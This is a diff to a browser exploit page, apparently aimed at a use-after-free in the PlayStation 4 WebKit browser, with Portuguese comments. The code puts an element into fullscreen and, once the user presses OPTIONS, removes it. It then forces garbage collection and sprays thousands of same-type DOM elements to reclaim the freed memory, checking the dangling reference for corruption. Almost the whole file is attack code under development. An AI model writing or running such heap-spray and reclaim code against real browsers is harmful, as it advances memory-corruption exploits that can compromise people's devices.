@@ -1,134 +1,163 @@
+
 <!DOCTYPE html>
 <html>
 <head>
 <meta charset="UTF-8">
-<title>PS4 UAF - Aggressive Reclaim REAL</title>
+<title>PS4 UAF Stabilization Test</title>
 </head>
 <body style="background:#111;color:#0f0;font-family:monospace;">
 
-<h2>Aggressive Reclaim (Real)</h2>
-<button onclick="run()">Run</button>
+<h2>PS4 UAF - Deterministic Reclaim</h2>
+<button onclick="runTest()">Run Test</button>
 
-<div id="log"></div>
+<div id="log" style="margin-top:20px;"></div>
 
 <script>
-function log(msg){
+function log(msg) {
     try { console.log(msg); } catch(e){}
     document.getElementById("log").innerHTML += "<p>" + msg + "</p>";
 }
 
-function setupHeap(){
-    let controllers = [];
-    for(let i = 0; i < 5000; i++){
-        let arr = new Float64Array(8);
-        arr[0] = i;
-        controllers.push(arr);
+// ==========================
+// HEAP PRESSURE (GC trigger)
+// ==========================
+function pressureGC() {
+    for (let i = 0; i < 50; i++) {
+        let tmp = new Array(100000).fill(i);
     }
-    return controllers;
 }
 
-function setupFS(){
+// ==========================
+// FULLSCREEN SETUP
+// ==========================
+function setupFullscreen() {
     let fsTarget = document.createElement("div");
-    fsTarget.innerHTML = "<h1 style='margin-top:20%;text-align:center;'>PRESS OPTIONS</h1>";
-    fsTarget.style = "position:absolute;top:0;left:0;width:100%;height:100%;background:black;";
+
+    fsTarget.innerHTML = "TARGET_OBJECT";
+    fsTarget.style.position = "absolute";
+    fsTarget.style.width = "100%";
+    fsTarget.style.height = "100%";
+    fsTarget.style.background = "black";
+
     document.body.appendChild(fsTarget);
-    fsTarget.webkitRequestFullscreen();
+
+    if (fsTarget.webkitRequestFullscreen) {
+        fsTarget.webkitRequestFullscreen();
+    } else {
+        document.documentElement.webkitRequestFullscreen?.();
+    }
+
     return fsTarget;
 }
 
-// 🔥 LOOP AGRESSIVO CONTÍNUO
-function startAggressiveReclaim(){
-    log("[*] Aggressive reclaim LOOP iniciado");
+// ==========================
+// 🔥 DETERMINISTIC RECLAIM
+// ==========================
+function aggressiveReclaim() {
+    log("[*] Reclaim start");
 
-    let running = true;
-
-    function sprayRound(){
-        if (!running) return;
-
-        let junk = [];
-
-        // 🔥 mistura pesada
-        for(let i = 0; i < 2000; i++){
-
-            // ArrayBuffer
-            let buf = new ArrayBuffer(0x100);
-            let f64 = new Float64Array(buf);
-            f64[0] = 13.37;
-
-            // Uint32
-            let u32 = new Uint32Array(buf);
-            u32[0] = 0x41414141;
-
-            // string
-            let str = "REUSE_" + i + "_" + Math.random();
-
-            // DOM
-            let div = document.createElement("div");
-            div.textContent = str;
-
-            junk.push(f64);
-            junk.push(u32);
-            junk.push(str);
-            junk.push(div);
-        }
-
-        // 🔥 força GC parcial
-        junk = null;
-
-        // loop contínuo
-        setTimeout(sprayRound, 0);
+    // Fase 1 - churn
+    for (let i = 0; i < 10000; i++) {
+        let el = document.createElement("div");
+        document.body.appendChild(el);
+        el.remove();
     }
 
-    sprayRound();
+    // Fase 2 - spray CONTROLADO (mesmo tipo)
+    for (let i = 0; i < 20000; i++) {
+        let el = document.createElement("div");
 
-    return () => { running = false; };
+        el.innerHTML = "REUSE_EL_" + i;
+        el.style.position = "absolute";
+        el.style.width = "100%";
+        el.style.height = "100%";
+
+        document.body.appendChild(el);
+    }
+
+    log("[*] Reclaim end");
 }
 
-function trigger(fsTarget){
+// ==========================
+// DETECÇÃO REAL
+// ==========================
+function detectCorruption(fsTarget) {
+    log("---- CHECK ----");
+
+    try {
+        let html = fsTarget.innerHTML;
+
+        log("[CHECK] innerHTML = " + html);
+
+        if (html && html.includes("REUSE_EL_")) {
+            log("[!!!] POSSÍVEL REUSE DETECTADO");
+        }
+
+    } catch(e) {
+        log("[UAF] innerHTML crash: " + e);
+    }
+
+    try {
+        fsTarget.innerHTML = "CORRUPTED_WRITE_TEST";
+        log("[WRITE] sucesso");
+    } catch(e) {
+        log("[UAF WRITE FAIL] " + e);
+    }
+}
+
+// ==========================
+// TRIGGER REFORÇADO
+// ==========================
+function trigger(fsTarget) {
     log("[*] Trigger");
 
     try {
         fsTarget.remove();
 
         if (document.webkitIsFullScreen || document.fullscreenElement) {
-            document.webkitExitFullscreen?.();
+            document.webkitExitFullscreen?.() || document.webkitCancelFullScreen?.();
         }
 
-    } catch(e){
+    } catch(e) {
         log("[ERRO] " + e);
     }
 
-    // 🔴 NÃO MEXER
-    setTimeout(() => location.reload(), 500);
+    // 💣 Alinhamento crítico
+    pressureGC();
+
+    // 🔥 Reclaim síncrono pesado
+    for (let i = 0; i < 5; i++) {
+        aggressiveReclaim();
+    }
+
+    // 🔬 Check
+    setTimeout(() => detectCorruption(fsTarget), 100);
 }
 
-function run(){
-    log("Running... Press OPTIONS");
+// ==========================
+// LOOP DE TENTATIVA
+// ==========================
+function multiTrigger(fsTarget) {
+    for (let i = 0; i < 10; i++) {
+        setTimeout(() => trigger(fsTarget), i * 200);
+    }
+}
 
-    let controllers = setupHeap();
-    let fsTarget = setupFS();
+// ==========================
+// MAIN
+// ==========================
+function runTest() {
+    const logDiv = document.getElementById("log");
+    logDiv.innerHTML = "<p>Running... Press OPTIONS</p>";
 
-    window.onblur = function(){
+    log("[*] Start");
+
+    let fsTarget = setupFullscreen();
+
+    window.onblur = function() {
         log("[*] onblur");
 
-        setTimeout(() => {
-
-            log("[*] Janela crítica iniciada");
-
-            // 🔥 começa reclaim CONTÍNUO
-            let stopReclaim = startAggressiveReclaim();
-
-            // pequeno delay pra acumular pressão
-            setTimeout(() => {
-
-                trigger(fsTarget);
-
-                // opcional: parar depois
-                setTimeout(() => stopReclaim(), 200);
-
-            }, 50);
-
-        }, 3000);
+        setTimeout(() => multiTrigger(fsTarget), 2000);
     };
 }
 </script>
